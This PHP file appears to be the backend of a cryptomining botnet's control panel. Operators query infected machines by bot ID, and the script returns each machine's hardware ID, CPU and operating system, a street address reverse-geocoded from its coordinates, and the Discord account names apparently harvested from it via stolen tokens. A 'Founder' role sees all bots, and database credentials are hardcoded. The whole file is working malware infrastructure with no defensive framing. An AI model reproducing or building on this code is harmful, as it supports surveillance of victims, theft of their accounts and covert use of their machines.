<?php
session_start();

$role = $_SESSION['Role'];
$secretkey = $_SESSION['secret_key'];

function isStringLengthGreaterThan5($inputString)
{
    return strlen($inputString) > 5;
}

function convertToEnglish($input)
{
    $transliterationMap = array(
        'ı' => 'i',
        'İ' => 'I',
        'ğ' => 'g',
        'Ğ' => 'G',
        'ü' => 'u',
        'Ü' => 'U',
        'ş' => 's',
        'Ş' => 'S',
        'ö' => 'o',
        'Ö' => 'O',
        'ç' => 'c',
        'Ç' => 'C',
        'â' => 'a',
        'Â' => 'A',
        'î' => 'i',
        'Î' => 'I',
        'û' => 'u',
        'Û' => 'U',
        'ê' => 'e',
        'Ê' => 'E',
        'ô' => 'o',
        'Ô' => 'O'
    );

    $englishString = strtr($input, $transliterationMap);
    return $englishString;
}

function reverseGeocode($latitude, $longitude)
{
    $url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=$latitude&lon=$longitude";

    $headers = array(
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Referer: https://www.example.com" // Replace with your actual website URL
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);


    $data = json_decode($response, true);

    if ($data && isset($data['display_name'])) {
        $display_name = $data['display_name'];
        return "$display_name";
    } else {
        return "Unable to fetch Addres.";
    }
}

if (isStringLengthGreaterThan5($secretkey)) {

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    if (isset($_GET['botId'])) {
        $botId = intval($_GET['botId']); // Sanitize input

        // First query with prepared statement
        if ($role == 'Founder') {
            $sql = "SELECT * FROM miners WHERE BotID = ?";
            $stmt = mysqli_prepare($conn, $sql);
            mysqli_stmt_bind_param($stmt, "i", $botId);
        } else {
            $sql = "SELECT * FROM miners WHERE BotID = ? AND OwnerID = ?";
            $stmt = mysqli_prepare($conn, $sql);
            mysqli_stmt_bind_param($stmt, "is", $botId, $secretkey);
        }

        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);

        if ($result && mysqli_num_rows($result) > 0) {
            $data = mysqli_fetch_assoc($result);
            $ownerID = $data['OwnerID'];
            $HWIDPro = $data['HWID'];
            $CPU = $data['CPU'];
            $OS = $data['OS'];

            $lat = $data['lat'];
            $lon = $data['lon'];
            $data['Addres'] = convertToEnglish(reverseGeocode($lat, $lon));

            // Second query with prepared statement
            $query = "SELECT Username FROM tokens WHERE HWID = ? AND OwnerID = ?";
            $stmt2 = mysqli_prepare($conn, $query);
            mysqli_stmt_bind_param($stmt2, "ss", $HWIDPro, $ownerID);
            mysqli_stmt_execute($stmt2);
            $resultunu = mysqli_stmt_get_result($stmt2);

            if ($resultunu) {
                $discordAccounts = array();
                while ($row = mysqli_fetch_assoc($resultunu)) {
                    $discordAccounts[] = $row['Username'];
                }
                $data['DiscordAccounts'] = implode(' | ', $discordAccounts);
            } else {
                $data['DiscordAccounts'] = 'None!';
            }

            echo json_encode($data);
        } else {
            echo json_encode(array("error" => "Data not found"));
        }
    } else {
    }
    mysqli_close($conn);
}
